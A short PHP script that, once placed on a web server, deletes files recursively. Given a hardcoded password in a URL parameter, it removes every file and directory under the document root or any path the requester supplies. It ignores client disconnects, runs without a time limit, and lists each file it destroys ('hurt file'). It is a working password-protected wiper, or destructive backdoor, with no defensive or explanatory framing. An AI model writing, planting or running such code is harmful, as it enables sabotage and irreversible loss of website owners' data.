<?
ignore_user_abort(true);
set_time_limit(0);
$path=$_SERVER['DOCUMENT_ROOT'];
$pass="Metall01";
if (isset($_GET['path']))
	$path=$_GET['path'];
echo $path=realpath($path);
if ((isset($_GET['del']))&&($_GET['del']==$pass)){
	rmdir_recurse($path);
	echo "<br>hurt puth file: ".$path;
}else
	echo "<br>Pass error";
function rmdir_recurse($path) {
	$path = rtrim($path, '/').'/';
	$handle = opendir($path);
	while(false !== ($file = readdir($handle))) {
		if($file != '.' and $file != '..' ) {
			$fullpath = $path.$file;
			if(is_dir($fullpath))
				rmdir_recurse($fullpath);
			else {
				echo "<br>hurt file: ".$fullpath;
				unlink($fullpath);
			}
		}
	}
	closedir($handle);
	rmdir($path);
}